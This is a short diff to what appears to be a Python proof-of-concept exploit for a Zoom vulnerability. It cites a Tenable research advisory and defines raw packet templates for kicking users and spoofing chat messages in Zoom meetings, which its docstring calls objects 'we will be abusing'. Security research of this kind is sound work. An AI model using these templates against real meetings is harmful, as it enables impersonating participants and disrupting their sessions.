@@ -1,3 +1,7 @@
+# David Wells
+# https://www.tenable.com/security/research/tra-2018-40
+#
+
 class Msg_Templates:
     '''
     Message Templates for Initializing Various Zoom Class Objects That We Will Be Abusing
@@ -8,7 +12,7 @@ class Msg_Templates:
                          
     KICK_USER = ('{}\x0e\x01{}\x00\x04\x00\x01\x00\x04\x00\x88\x04{}{}\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00')   
 
-    CHAT_MSG = ('\x07\x00\x00\x00Version'      # Version 
+    CHAT_MSG = ('\x07\x00\x00\x00Version'       # Version 
                 '\x04\x00\x00\x001.00'          # 1.00
                 '\x07\x00\x00\x00Content'       # Content
                 '{}\x00\x00\x00{}'              # Msg
